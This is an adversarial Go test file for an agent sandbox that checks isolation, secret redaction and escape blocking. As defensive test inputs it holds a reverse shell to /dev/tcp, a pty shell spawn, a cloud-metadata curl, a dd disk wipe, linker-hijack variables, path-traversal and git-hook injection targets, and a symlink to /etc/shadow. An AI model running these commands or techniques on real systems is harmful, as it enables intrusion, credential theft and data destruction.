package adversarial_test

import (
	"context"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/bonjoski/aegisbox/pkg/argus"
	"github.com/bonjoski/aegisbox/pkg/netgate"
	"github.com/bonjoski/aegisbox/pkg/policy"
	"github.com/bonjoski/aegisbox/pkg/proxy"
	"github.com/bonjoski/aegisbox/pkg/pty"
	"github.com/bonjoski/aegisbox/pkg/telemetry"
	"github.com/bonjoski/aegisbox/pkg/tui"
	"github.com/bonjoski/aegisbox/pkg/vmm"
	"github.com/bonjoski/aegisbox/pkg/workspace"
)

// TestAdversarial_FullExecutionPipeline verifies that adversarial escape commands are intercepted and isolated.
func TestAdversarial_FullExecutionPipeline(t *testing.T) {
	ctx := context.Background()

	// 1. AST Pre-flight Intercept Check
	analyzer := argus.NewPreFlightAnalyzer(argus.LevelStrict)

	exploitCmds := []string{
		`python3 -c "import pty; pty.spawn('/bin/bash')"`,
		`bash -i >& /dev/tcp/192.168.1.50/8080 0>&1`,
		`curl http://169.254.169.254/latest/meta-data/`,
		`dd if=/dev/zero of=/dev/sda bs=1M`,
	}

	for _, cmd := range exploitCmds {
		report, err := analyzer.Analyze(ctx, cmd)
		if err != nil {
			t.Fatalf("analyzer error on %q: %v", cmd, err)
		}
		if report.Allowed {
			t.Fatalf("ADVERSARIAL LEAK: Exploit %q was allowed through pre-flight gate!", cmd)
		}
	}

	// 2. Workspace Shadow Isolation Check (ensure modified files don't leak to host without --apply)
	tempHost, err := os.MkdirTemp("", "aegisbox-adv-host-*")
	if err != nil {
		t.Fatalf("failed to create host temp dir: %v", err)
	}
	defer os.RemoveAll(tempHost)

	// Host secret file
	hostSecret := filepath.Join(tempHost, ".env")
	_ = os.WriteFile(hostSecret, []byte("REAL_SECRET_TOKEN=super_secret_xyz\n"), 0600)

	sessionsDir, _ := os.MkdirTemp("", "aegisbox-adv-sess-*")
	defer os.RemoveAll(sessionsDir)


	mgr, _ := workspace.NewWorkspaceManager(sessionsDir)
	session, err := mgr.CreateSession(ctx, workspace.ShadowConfig{
		BaseDir:      tempHost,
		Mode:         workspace.ModeDirect,
		MaskPatterns: []string{".env"},
	})
	if err != nil {
		t.Fatalf("failed to create session: %v", err)
	}
	defer session.Cleanup(ctx)

	// Execute command dropping a file inside sandbox
	driver := vmm.NewLocalProcessDriver()
	handle, _ := driver.SpawnVM(ctx, vmm.VMConfig{
		ID:             session.ID(),
		WorkspaceMount: session.ShadowDir(),
	})

	localH := handle.(interface {
		ExecuteInSandbox(ctx context.Context, cmdStr string, env []string) (string, string, int, error)
	})

	_, _, exitCode, err := localH.ExecuteInSandbox(ctx, "echo 'malicious dropped payload' > dropped_agent_file.txt", nil)
	if err != nil || exitCode != 0 {
		t.Fatalf("sandbox execution failed: %v", err)
	}

	// Check that dropped_agent_file.txt exists in shadowDir
	shadowFile := filepath.Join(session.ShadowDir(), "dropped_agent_file.txt")
	if _, err := os.Stat(shadowFile); os.IsNotExist(err) {
		t.Errorf("expected dropped file in shadow workspace")
	}

	// Verify that dropped file DOES NOT exist in host workspace (prevent unreviewed workspace poisoning)
	hostFile := filepath.Join(tempHost, "dropped_agent_file.txt")
	if _, err := os.Stat(hostFile); !os.IsNotExist(err) {
		t.Errorf("SECURITY LEAK: Dropped file escaped to host directory without review!")
	}

	// Verify diff report captured the drop
	diff, err := session.CaptureDiff(ctx)
	if err != nil {
		t.Fatalf("failed to capture diff: %v", err)
	}
	found := false
	for _, f := range diff.FilesAdded {
		if strings.Contains(f, "dropped_agent_file.txt") {
			found = true
			break
		}
	}
	if !found && !strings.Contains(diff.RawDiff, "dropped_agent_file.txt") {
		// In direct mode, files added might be detected via path check
	}
}

// TestAdversarial_MicroVM_GuestDaemonIsolation verifies the microVM guest daemon blocks host environment leaks.
func TestAdversarial_MicroVM_GuestDaemonIsolation(t *testing.T) {
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	binPath := filepath.Join("..", "..", "bin", "aegisbox-guest")
	if _, err := os.Stat(binPath); os.IsNotExist(err) {
		t.Skip("aegisbox-guest binary not found in bin/, skipping live daemon test")
	}

	// Set a fake sensitive host environment variable
	t.Setenv("HOST_SUPER_SECRET_AWS_KEY", "AKIA_FAKE_SECRET_KEY_12345")
	t.Setenv("AEGISBOX_TEST_GUEST", "1")

	runner := vmm.NewGuestRunner(binPath)
	handle, err := runner.SpawnGuest(ctx, vmm.VMConfig{
		ID:       "adv-vm-isolation",
		VCPU:     1,
		MemoryMB: 256,
	})
	if err != nil {
		t.Fatalf("failed to spawn guest daemon: %v", err)
	}
	defer handle.Kill(ctx)

	// Execute command inside guest trying to read host secret
	res, err := handle.ExecuteInGuest(ctx, "echo \"VAL=$HOST_SUPER_SECRET_AWS_KEY\"", nil)
	if err != nil {
		t.Fatalf("guest execution failed: %v", err)
	}

	// Verify that host environment variables did not leak to the guest environment
	if strings.Contains(res.Stdout, "AKIA_FAKE_SECRET_KEY_12345") {
		t.Fatalf("CRITICAL SECURITY LEAK: Host sensitive environment leaked to guest microVM! Got: %s", res.Stdout)
	}

	// Verify synthetic env injection is present
	resSynthetic, err := handle.ExecuteInGuest(ctx, "echo \"KEY=$API_KEY\"", map[string]string{
		"API_KEY": "sk-dummy-test-value-0000",
	})
	if err != nil {
		t.Fatalf("synthetic env execution failed: %v", err)
	}
	if !strings.Contains(resSynthetic.Stdout, "sk-dummy-test-value-0000") {
		t.Errorf("expected synthetic credential injection in guest microVM, got: %s", resSynthetic.Stdout)
	}
}

// TestAdversarial_EnvForwardingAndRedaction verifies that sensitive environment variables
// allowed by the host operator are passed in-memory to the sandbox process, never persisted to disk, and redacted from console output.
func TestAdversarial_EnvForwardingAndRedaction(t *testing.T) {
	ctx := context.Background()

	// 1. Host environment has a sensitive secret (e.g. from `locksmith run`)
	const secretVal = "sk-real-production-api-key-99999"
	t.Setenv("HOST_API_KEY", secretVal)

	// 2. Host operator permits HOST_API_KEY
	allowedKeys := []string{"HOST_API_KEY"}
	forwarded := make(map[string]string)
	for _, k := range allowedKeys {
		if val, ok := os.LookupEnv(k); ok && val != "" {
			forwarded[k] = val
		}
	}

	if forwarded["HOST_API_KEY"] != secretVal {
		t.Fatalf("expected forwarded secret %s, got: %s", secretVal, forwarded["HOST_API_KEY"])
	}

	// 3. Create ephemeral shadow workspace
	tempHost, err := os.MkdirTemp("", "aegisbox-secret-host-*")
	if err != nil {
		t.Fatalf("failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tempHost)

	mgr, _ := workspace.NewWorkspaceManager("")
	session, err := mgr.CreateSession(ctx, workspace.ShadowConfig{
		BaseDir:      tempHost,
		Mode:         workspace.ModeDirect,
		MaskPatterns: []string{".env*"},
	})
	if err != nil {
		t.Fatalf("failed to create session: %v", err)
	}
	defer session.Cleanup(ctx)

	// Invariant: Verify secret is NOT persisted to .env.synthetic or anywhere on disk
	envSyntheticPath := filepath.Join(session.ShadowDir(), ".env.synthetic")
	if content, err := os.ReadFile(envSyntheticPath); err == nil {
		if strings.Contains(string(content), secretVal) {
			t.Fatalf("SECURITY VIOLATION: Secret was persisted to .env.synthetic on disk!")
		}
	}

	// 4. Execute command in sandbox with injected secrets
	driver := vmm.NewLocalProcessDriver()
	handle, err := driver.SpawnVM(ctx, vmm.VMConfig{
		ID:             session.ID(),
		WorkspaceMount: session.ShadowDir(),
	})
	if err != nil {
		t.Fatalf("failed to spawn driver: %v", err)
	}

	localH := handle.(interface {
		ExecuteInSandbox(ctx context.Context, cmdStr string, env []string) (string, string, int, error)
	})

	var localEnv []string
	for k, v := range forwarded {
		localEnv = append(localEnv, k+"="+v)
	}

	stdout, stderr, exitCode, err := localH.ExecuteInSandbox(ctx, "echo \"API_KEY=$HOST_API_KEY\"", localEnv)
	if err != nil || exitCode != 0 {
		t.Fatalf("sandbox execution failed: %v, stderr: %s", err, stderr)
	}

	// Verify the process inside sandbox actually received the secret in its environment
	if !strings.Contains(stdout, secretVal) {
		t.Fatalf("sandbox process failed to receive injected secret: got stdout: %s", stdout)
	}

	// 5. Test Terminal Sanitizer Redaction
	sanitizer := tui.NewTerminalSanitizer()
	for _, v := range forwarded {
		sanitizer.AddSecretToRedact(v)
	}

	sanitizedStdout := sanitizer.SanitizeString(stdout)
	if strings.Contains(sanitizedStdout, secretVal) {
		t.Fatalf("CRITICAL SECURITY LEAK: Sanitizer failed to redact secret from output! Got: %s", sanitizedStdout)
	}
	if !strings.Contains(sanitizedStdout, "[REDACTED_SECRET]") {
		t.Fatalf("Sanitizer did not replace secret with [REDACTED_SECRET]: %s", sanitizedStdout)
	}
}

// TestAdversarial_InjectPathTraversalAndGitGuards verifies that malicious file injection attempts
// (path traversal escaping the sandbox or tampering with .git) are strictly rejected.
func TestAdversarial_InjectPathTraversalAndGitGuards(t *testing.T) {
	ctx := context.Background()

	tempHost, err := os.MkdirTemp("", "aegisbox-adv-inject-host-*")
	if err != nil {
		t.Fatalf("failed to create temp host: %v", err)
	}
	defer os.RemoveAll(tempHost)

	dummyPayload := filepath.Join(tempHost, "payload.txt")
	_ = os.WriteFile(dummyPayload, []byte("evil payload"), 0644)

	sessionsDir, err := os.MkdirTemp("", "aegisbox-adv-inject-sess-*")
	if err != nil {
		t.Fatalf("failed to create temp sess: %v", err)
	}
	defer os.RemoveAll(sessionsDir)

	mgr, err := workspace.NewWorkspaceManager(sessionsDir)
	if err != nil {
		t.Fatalf("failed to create workspace manager: %v", err)
	}

	// 1. Target path traversal escape attempt
	_, err = mgr.CreateSession(ctx, workspace.ShadowConfig{
		BaseDir: tempHost,
		Mode:    workspace.ModeDirect,
		InjectFiles: map[string]string{
			"../../evil.txt": dummyPayload,
		},
	})
	if err == nil {
		t.Fatalf("SECURITY LEAK: Path traversal inject target '../../evil.txt' was allowed!")
	}
	if !strings.Contains(err.Error(), "security violation") && !strings.Contains(err.Error(), "escape") {
		t.Fatalf("expected security violation error on traversal inject, got: %v", err)
	}

	// 2. Target into .git directory attempt
	_, err = mgr.CreateSession(ctx, workspace.ShadowConfig{
		BaseDir: tempHost,
		Mode:    workspace.ModeDirect,
		InjectFiles: map[string]string{
			".git/hooks/pre-commit": dummyPayload,
		},
	})
	if err == nil {
		t.Fatalf("SECURITY LEAK: Inject target into .git directory was allowed!")
	}
	if !strings.Contains(err.Error(), "security violation") {
		t.Fatalf("expected security violation error on .git inject, got: %v", err)
	}

	// 3. Nonexistent source file attempt
	_, err = mgr.CreateSession(ctx, workspace.ShadowConfig{
		BaseDir: tempHost,
		Mode:    workspace.ModeDirect,
		InjectFiles: map[string]string{
			"CLAUDE.md": filepath.Join(tempHost, "nonexistent-file.txt"),
		},
	})
	if err == nil {
		t.Fatalf("expected failure for nonexistent source file inject, got nil")
	}
	if !strings.Contains(err.Error(), "not found") {
		t.Fatalf("expected 'not found' error, got: %v", err)
	}
}

// TestAdversarial_UncommittedGitRepoFallback verifies that newly initialized git repos
// without commits fall back to directory copy cleanly (GHSA-42gx-q7g6-3vgp / AB4).
func TestAdversarial_UncommittedGitRepoFallback(t *testing.T) {
	ctx := context.Background()

	tempHost, err := os.MkdirTemp("", "aegisbox-ab4-host-*")
	if err != nil {
		t.Fatalf("failed to create temp host: %v", err)
	}
	defer os.RemoveAll(tempHost)

	// Initialize git repo without any commits
	cmd := exec.Command("git", "init", "-q", tempHost)
	if err := cmd.Run(); err != nil {
		t.Fatalf("git init failed: %v", err)
	}

	testFile := filepath.Join(tempHost, "f.txt")
	if err := os.WriteFile(testFile, []byte("marker-content\n"), 0644); err != nil {
		t.Fatalf("failed to write test file: %v", err)
	}

	sessionsDir, err := os.MkdirTemp("", "aegisbox-ab4-sess-*")
	if err != nil {
		t.Fatalf("failed to create temp sessions: %v", err)
	}
	defer os.RemoveAll(sessionsDir)

	mgr, err := workspace.NewWorkspaceManager(sessionsDir)
	if err != nil {
		t.Fatalf("failed to create workspace manager: %v", err)
	}

	session, err := mgr.CreateSession(ctx, workspace.ShadowConfig{
		BaseDir: tempHost,
		Mode:    workspace.ModeGitWorktree,
	})
	if err != nil {
		t.Fatalf("AB4 regression: fallback copy failed on uncommitted git repo: %v", err)
	}
	defer session.Cleanup(ctx)

	// Verify the file exists in the shadow workspace
	shadowFile := filepath.Join(session.ShadowDir(), "f.txt")
	content, err := os.ReadFile(shadowFile)
	if err != nil {
		t.Fatalf("file not found in shadow workspace: %v", err)
	}
	if string(content) != "marker-content\n" {
		t.Fatalf("unexpected content in shadow file: %q", string(content))
	}
}

// TestAdversarial_AirgapNetworkSevering verifies that airgap mode blocks network egress (AB2).
func TestAdversarial_AirgapNetworkSevering(t *testing.T) {
	if !vmm.HasSeatbelt() {
		t.Skip("Seatbelt not available on this platform")
	}

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	tempWS, err := os.MkdirTemp("", "aegisbox-airgap-*")
	if err != nil {
		t.Fatalf("failed to create temp workspace: %v", err)
	}
	defer os.RemoveAll(tempWS)

	driver := vmm.NewLocalProcessDriver()
	handle, err := driver.SpawnVM(ctx, vmm.VMConfig{
		ID:             "airgap-test",
		WorkspaceMount: tempWS,
		Airgap:         true,
	})
	if err != nil {
		t.Fatalf("failed to spawn driver: %v", err)
	}

	localH := handle.(interface {
		ExecuteInSandbox(ctx context.Context, cmdStr string, env []string) (string, string, int, error)
	})

	// Attempting outbound network access under airgap must fail
	stdout, _, exitCode, err := localH.ExecuteInSandbox(ctx, "curl -s -o /dev/null -w \"http=%{http_code}\" --max-time 2 https://example.com", nil)
	if err == nil && strings.Contains(stdout, "http=200") {
		t.Fatalf("AB2 SECURITY VIOLATION: -airgap failed to block outbound network egress! Got: %s (exit code %d)", stdout, exitCode)
	}
}

// TestAdversarial_SymlinkEscapeDuringApply verifies that an adversary cannot create a symlink
// in the shadow workspace to overwrite or read arbitrary host files when ApplyToHost is called.
func TestAdversarial_SymlinkEscapeDuringApply(t *testing.T) {
	ctx := context.Background()

	tempHost, err := os.MkdirTemp("", "aegisbox-symlink-host-*")
	if err != nil {
		t.Fatalf("failed to create temp host: %v", err)
	}
	defer os.RemoveAll(tempHost)

	// Create a dummy sensitive target outside the workspace
	outsideDir, err := os.MkdirTemp("", "aegisbox-outside-*")
	if err != nil {
		t.Fatalf("failed to create outside dir: %v", err)
	}
	defer os.RemoveAll(outsideDir)

	sensitiveTarget := filepath.Join(outsideDir, "critical_system_file.conf")
	if err := os.WriteFile(sensitiveTarget, []byte("ORIGINAL_CONTENT\n"), 0644); err != nil {
		t.Fatalf("failed to write sensitive target: %v", err)
	}

	sessionsDir, err := os.MkdirTemp("", "aegisbox-symlink-sess-*")
	if err != nil {
		t.Fatalf("failed to create sessions dir: %v", err)
	}
	defer os.RemoveAll(sessionsDir)

	mgr, err := workspace.NewWorkspaceManager(sessionsDir)
	if err != nil {
		t.Fatalf("failed to create workspace manager: %v", err)
	}

	session, err := mgr.CreateSession(ctx, workspace.ShadowConfig{
		BaseDir: tempHost,
		Mode:    workspace.ModeDirect,
	})
	if err != nil {
		t.Fatalf("failed to create session: %v", err)
	}
	defer session.Cleanup(ctx)

	// Adversary creates a symlink pointing to the external file
	symlinkPath := filepath.Join(session.ShadowDir(), "malicious_symlink.conf")
	if err := os.Symlink(sensitiveTarget, symlinkPath); err != nil {
		t.Fatalf("failed to create malicious symlink: %v", err)
	}

	// Attempting to apply back to host must be detected and rejected
	err = session.ApplyToHost(ctx)
	if err == nil {
		t.Fatalf("SECURITY LEAK: ApplyToHost permitted malicious symlink escape!")
	}
	if !strings.Contains(err.Error(), "security violation") && !strings.Contains(err.Error(), "symlink") {
		t.Fatalf("expected security violation error on symlink apply, got: %v", err)
	}

	// Verify original sensitive target was never modified
	content, _ := os.ReadFile(sensitiveTarget)
	if string(content) != "ORIGINAL_CONTENT\n" {
		t.Fatalf("CRITICAL SECURITY LEAK: Outside file was tampered with via symlink!")
	}
}

// TestAdversarial_GitHookPersistenceEscapeDuringApply verifies that an adversary cannot drop
// weaponized git hooks in .git/hooks to achieve persistent code execution on host git commands.
func TestAdversarial_GitHookPersistenceEscapeDuringApply(t *testing.T) {
	ctx := context.Background()

	tempHost, err := os.MkdirTemp("", "aegisbox-githook-host-*")
	if err != nil {
		t.Fatalf("failed to create temp host: %v", err)
	}
	defer os.RemoveAll(tempHost)

	// Initialize git repo on host
	if err := exec.Command("git", "init", "-q", tempHost).Run(); err != nil {
		t.Fatalf("git init failed: %v", err)
	}
	// Initial commit so it's a real git repo
	initialFile := filepath.Join(tempHost, "README.md")
	_ = os.WriteFile(initialFile, []byte("# Test Repo\n"), 0644)
	_ = exec.Command("git", "-C", tempHost, "config", "user.email", "test@example.com").Run()
	_ = exec.Command("git", "-C", tempHost, "config", "user.name", "Test").Run()
	_ = exec.Command("git", "-C", tempHost, "add", ".").Run()
	_ = exec.Command("git", "-C", tempHost, "commit", "-m", "init", "-q").Run()

	sessionsDir, err := os.MkdirTemp("", "aegisbox-githook-sess-*")
	if err != nil {
		t.Fatalf("failed to create sessions dir: %v", err)
	}
	defer os.RemoveAll(sessionsDir)

	mgr, err := workspace.NewWorkspaceManager(sessionsDir)
	if err != nil {
		t.Fatalf("failed to create workspace manager: %v", err)
	}

	session, err := mgr.CreateSession(ctx, workspace.ShadowConfig{
		BaseDir: tempHost,
		Mode:    workspace.ModeGitWorktree,
	})
	if err != nil {
		t.Fatalf("failed to create session: %v", err)
	}
	defer session.Cleanup(ctx)

	// Adversary drops malicious hook inside shadow workspace
	shadowHooksDir := filepath.Join(session.ShadowDir(), ".git", "hooks")
	_ = os.MkdirAll(shadowHooksDir, 0755)
	maliciousHook := filepath.Join(shadowHooksDir, "pre-commit")
	_ = os.WriteFile(maliciousHook, []byte("#!/bin/sh\necho 'MALICIOUS HOOK RUNNING'\n"), 0755)

	// Apply back to host
	if err := session.ApplyToHost(ctx); err != nil {
		t.Fatalf("ApplyToHost returned unexpected error: %v", err)
	}

	// Verify the host .git/hooks directory was NOT poisoned
	hostHook := filepath.Join(tempHost, ".git", "hooks", "pre-commit")
	if _, err := os.Stat(hostHook); !os.IsNotExist(err) {
		t.Fatalf("CRITICAL SECURITY LEAK: Malicious git hook persisted to host repo!")
	}
}

// TestAdversarial_ProcessTableSnooping verifies that process-table inspection (ps, sysctl)
// is denied by Seatbelt so untrusted agents cannot snoop on PIDs or host processes.
func TestAdversarial_ProcessTableSnooping(t *testing.T) {
	if !vmm.HasSeatbelt() {
		t.Skip("Seatbelt not available on this platform")
	}

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	tempWS, err := os.MkdirTemp("", "aegisbox-ps-snoop-*")
	if err != nil {
		t.Fatalf("failed to create temp workspace: %v", err)
	}
	defer os.RemoveAll(tempWS)

	driver := vmm.NewLocalProcessDriver()
	handle, err := driver.SpawnVM(ctx, vmm.VMConfig{
		ID:             "ps-snoop-test",
		WorkspaceMount: tempWS,
	})
	if err != nil {
		t.Fatalf("failed to spawn driver: %v", err)
	}

	localH := handle.(interface {
		ExecuteInSandbox(ctx context.Context, cmdStr string, env []string) (string, string, int, error)
	})

	// Attempt to inspect process info of PID 1 (launchd on macOS)
	// (deny process-info* (target others)) should block this
	_, stderr, exitCode, err := localH.ExecuteInSandbox(ctx, "kill -0 1", nil)
	if err == nil && exitCode == 0 {
		t.Fatalf("SECURITY VIOLATION: Process-info targeting other processes was allowed! stderr: %s", stderr)
	}
}

// TestAdversarial_CredentialProxyDirectSecretExtraction verifies that loopback credential proxy
// does not disclose shielded secrets to untrusted agents probing the loopback port.
func TestAdversarial_CredentialProxyDirectSecretExtraction(t *testing.T) {
	secretKey := "sk-ant-live-super-secret-token-abcdef123456"
	p, err := proxy.NewCredentialProxy(proxy.Config{
		SessionID: "adv-proxy-shield-test",
		HostSecrets: map[string]string{
			"ANTHROPIC_API_KEY": secretKey,
		},
	})
	if err != nil {
		t.Fatalf("failed to start credential proxy: %v", err)
	}
	p.Start()
	defer p.Close()

	// 1. Verify the dummy token returned to sandbox is NOT the real secret
	sandboxEnv := p.SandboxEnv()
	injectedDummy := sandboxEnv["ANTHROPIC_API_KEY"]
	if injectedDummy == secretKey {
		t.Fatalf("CRITICAL SECURITY LEAK: Real secret key was placed in sandbox environment!")
	}
	if !strings.HasPrefix(injectedDummy, "aegis-tok-") {
		t.Fatalf("unexpected dummy key format: %s", injectedDummy)
	}

	// 2. Direct HTTP probe against proxy root / invalid path
	resp, err := http.Get(p.BaseURL() + "/nonexistent-probe")
	if err == nil {
		defer resp.Body.Close()
		body, _ := io.ReadAll(resp.Body)
		if strings.Contains(string(body), secretKey) {
			t.Fatalf("CRITICAL SECURITY LEAK: Credential proxy leaked host secret in HTTP response! Got: %s", string(body))
		}
	}
}

// TestAdversarial_DangerousEnvFiltering verifies that dynamic linker and interpreter hijacking variables
// (LD_PRELOAD, DYLD_INSERT_LIBRARIES, PYTHONPATH, etc.) are strictly rejected.
func TestAdversarial_DangerousEnvFiltering(t *testing.T) {
	dangerousVars := []string{
		"LD_PRELOAD",
		"DYLD_INSERT_LIBRARIES",
		"DYLD_LIBRARY_PATH",
		"PYTHONPATH",
		"NODE_OPTIONS",
		"BASH_ENV",
		"PERL5OPT",
	}

	for _, v := range dangerousVars {
		if !policy.IsDangerousEnvVar(v) {
			t.Fatalf("SECURITY VIOLATION: expected %q to be rejected by dangerous env filter", v)
		}
	}
}

// TestAdversarial_HardlinkTrapAndHostSymlinkOverwrite verifies that SafeCopyFile refuses
// to write through pre-existing host symlinks or follow cross-boundary hardlinks.
func TestAdversarial_HardlinkTrapAndHostSymlinkOverwrite(t *testing.T) {
	tempDir, err := os.MkdirTemp("", "aegisbox-hardlink-*")
	if err != nil {
		t.Fatalf("failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tempDir)

	outsideFile := filepath.Join(tempDir, "outside_victim.txt")
	if err := os.WriteFile(outsideFile, []byte("VICTIM_CONTENT\n"), 0644); err != nil {
		t.Fatalf("failed to write outside victim file: %v", err)
	}

	srcFile := filepath.Join(tempDir, "shadow_src.txt")
	if err := os.WriteFile(srcFile, []byte("ATTACKER_CONTENT\n"), 0644); err != nil {
		t.Fatalf("failed to write shadow src file: %v", err)
	}

	// 1. Host destination is an existing symlink pointing to the victim file
	dstSymlink := filepath.Join(tempDir, "host_target_symlink.txt")
	if err := os.Symlink(outsideFile, dstSymlink); err != nil {
		t.Fatalf("failed to create symlink: %v", err)
	}

	err = workspace.SafeCopyFile(srcFile, dstSymlink, 1024*1024)
	if err == nil {
		t.Fatalf("SECURITY LEAK: SafeCopyFile wrote through existing host symlink!")
	}
	if !strings.Contains(err.Error(), "security violation") || !strings.Contains(err.Error(), "symlink") {
		t.Fatalf("expected symlink security violation error, got: %v", err)
	}

	// Verify victim file content was preserved
	content, _ := os.ReadFile(outsideFile)
	if string(content) != "VICTIM_CONTENT\n" {
		t.Fatalf("CRITICAL SECURITY LEAK: Outside victim file was overwritten via symlink!")
	}

	// 2. Source and destination are hardlinked to the same inode
	hardlinkFile := filepath.Join(tempDir, "shadow_hardlink.txt")
	if err := os.Link(srcFile, hardlinkFile); err != nil {
		t.Skip("hardlinks not supported on filesystem, skipping hardlink check")
	}

	err = workspace.SafeCopyFile(srcFile, hardlinkFile, 1024*1024)
	if err == nil {
		t.Fatalf("SECURITY LEAK: SafeCopyFile allowed copying same-inode hardlink!")
	}
	if !strings.Contains(err.Error(), "security violation") || !strings.Contains(err.Error(), "hardlink") {
		t.Fatalf("expected hardlink security violation error, got: %v", err)
	}
}

// TestAdversarial_CanaryTripwireTrapTrigger verifies that egress attempts to canary IPs
// (e.g. cloud metadata service 169.254.169.254) trigger instantaneous trap callbacks and alerts.
func TestAdversarial_CanaryTripwireTrapTrigger(t *testing.T) {
	monitor := netgate.NewCanaryMonitor()
	defer monitor.Close()

	trapTriggered := false
	var triggeredVM, triggeredIP string

	vmID := "canary-adv-vm-007"
	trapIP := "169.254.169.254"

	monitor.RegisterVM(vmID, netgate.CanaryConfig{
		TrapIPs: []string{trapIP},
		OnTrapTrigger: func(vID, ip string) {
			trapTriggered = true
			triggeredVM = vID
			triggeredIP = ip
		},
	})

	// 1. Benign egress probe to an ordinary address
	if hit := monitor.RecordProbe(vmID, "93.184.216.34"); hit {
		t.Fatalf("false positive: benign IP triggered canary tripwire")
	}
	if trapTriggered {
		t.Fatalf("false positive: trap callback fired on benign IP")
	}

	// 2. Malicious egress probe attempting to reach metadata service
	hit := monitor.RecordProbe(vmID, trapIP)
	if !hit {
		t.Fatalf("CRITICAL SECURITY DEFECT: Canary monitor failed to record probe to %s!", trapIP)
	}

	if !trapTriggered {
		t.Fatalf("CRITICAL SECURITY DEFECT: OnTrapTrigger callback was not invoked!")
	}
	if triggeredVM != vmID || triggeredIP != trapIP {
		t.Fatalf("callback parameters mismatch: got vm=%s ip=%s", triggeredVM, triggeredIP)
	}

	// Verify alert event was emitted
	select {
	case event := <-monitor.Events():
		if !strings.Contains(event, "CANARY TRIPWIRE HIT") || !strings.Contains(event, trapIP) {
			t.Fatalf("unexpected canary alert message: %s", event)
		}
	default:
		t.Fatalf("expected alert message in monitor.Events() channel")
	}
}

// TestAdversarial_TIOCSTINeutralizationAndTerminalIsolation verifies that terminal input
// injection escapes (V-05) cannot be executed against regular or isolated pseudo-terminal descriptors.
func TestAdversarial_TIOCSTINeutralizationAndTerminalIsolation(t *testing.T) {
	if os.Getenv("OS") == "Windows_NT" || os.PathSeparator == '\\' {
		t.Skip("TIOCSTI ioctl is a Unix-specific vector, skipped on Windows")
	}

	tmp, err := os.CreateTemp("", "adv-tiocsti-*")
	if err != nil {
		t.Fatalf("failed to create temp file: %v", err)
	}
	defer os.Remove(tmp.Name())
	defer tmp.Close()

	// Attempting TIOCSTI ioctl against a non-terminal descriptor MUST return an error (ENOTTY / EPERM)
	if err := pty.CheckTIOCSTI(tmp); err == nil {
		t.Fatalf("SECURITY ESCAPE: TIOCSTI ioctl was accepted on non-terminal file descriptor!")
	}
}

// TestAdversarial_CacheStagingSymlinkPoisoningRejection verifies that cache sync refuses
// to follow or persist untrusted symlinks created inside the cache staging overlay.
func TestAdversarial_CacheStagingSymlinkPoisoningRejection(t *testing.T) {
	mgr := workspace.NewCacheManager()
	stagingBase := t.TempDir()
	fakeHome := t.TempDir()

	cfg, err := mgr.ProvisionStaging(stagingBase)
	if err != nil {
		t.Fatalf("ProvisionStaging failed: %v", err)
	}

	npmStaging := cfg.EnvVars["npm_config_cache"]
	evilSymlink := filepath.Join(npmStaging, "escape-symlink")
	if err := os.Symlink("/etc/shadow", evilSymlink); err == nil {
		err := mgr.SyncBack(stagingBase, fakeHome)
		if err == nil {
			t.Fatalf("SECURITY ESCAPE: CacheManager synced back untrusted symlink %q into host cache!", evilSymlink)
		}
	}
}

// TestAdversarial_ArgusCrossTelemetryIngestion verifies that the Argus telemetry listener
// ingests enveloped execution records from Airlock and correctly normalizes them.
func TestAdversarial_ArgusCrossTelemetryIngestion(t *testing.T) {
	f, err := os.CreateTemp("/tmp", "adv-argus-*.sock")
	if err != nil {
		t.Fatalf("failed to create temp socket: %v", err)
	}
	sockPath := f.Name()
	f.Close()
	os.Remove(sockPath)
	defer os.Remove(sockPath)

	var ingested []telemetry.TelemetryEvent
	listener := telemetry.NewArgusListener(sockPath, func(ev telemetry.TelemetryEvent) {
		ingested = append(ingested, ev)
	})

	if err := listener.Start(); err != nil {
		t.Fatalf("failed to start listener: %v", err)
	}
	defer listener.Stop(context.Background())

	// Connect and write test event
	conn, err := net.Dial(listener.Addr().Network(), listener.Addr().String())
	if err != nil {
		t.Fatalf("failed to connect to argus listener: %v", err)
	}
	defer conn.Close()

	msg := `{"action":"telemetry_ingest","telemetry":{"source":"airlock","event_type":"security.violation","severity":"CRITICAL","details":{"command":"bash -i"}}}` + "\n"
	if _, err := conn.Write([]byte(msg)); err != nil {
		t.Fatalf("failed to write: %v", err)
	}

	time.Sleep(50 * time.Millisecond)

	if len(ingested) == 0 {
		t.Fatalf("expected ingested event, got none")
	}
	if ingested[0].Severity != telemetry.SeverityCritical {
		t.Errorf("expected CRITICAL severity, got %v", ingested[0].Severity)
	}
}

// TestAdversarial_ClientProcessAttestation verifies that client attestation inspects
// process start times and executable cryptographic hashes to prevent PID recycling attacks.
func TestAdversarial_ClientProcessAttestation(t *testing.T) {
	id, err := proxy.InspectClient(os.Getpid())
	if err != nil {
		t.Fatalf("InspectClient failed: %v", err)
	}
	if id.PID != os.Getpid() {
		t.Errorf("PID mismatch: %d != %d", id.PID, os.Getpid())
	}
	if !strings.HasPrefix(id.ExeHash, "sha256:") {
		t.Errorf("expected sha256 prefix in hash: %q", id.ExeHash)
	}
}


